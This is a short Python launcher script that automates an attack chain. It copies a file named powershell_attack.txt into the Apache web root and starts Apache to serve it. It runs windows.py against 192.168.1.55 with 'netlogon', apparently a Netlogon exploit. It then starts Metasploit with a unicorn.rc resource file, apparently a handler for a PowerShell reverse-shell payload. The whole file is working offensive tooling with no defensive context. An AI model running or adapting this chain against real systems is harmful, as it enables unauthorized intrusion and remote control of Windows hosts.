import subprocess 
#import time 
subprocess.call(['cp','powershell_attack.txt','//var/www/html'])
subprocess.call(['service','apache2','start'])
subprocess.call(['python','windows.py','192.168.1.55','netlogon'])
#subprocess.call(['cmatrix'])
#time.sleep(2)
#subprocess.call(['killall','cmatrix'])
subprocess.call(['msfconsole','-r','unicorn.rc'])

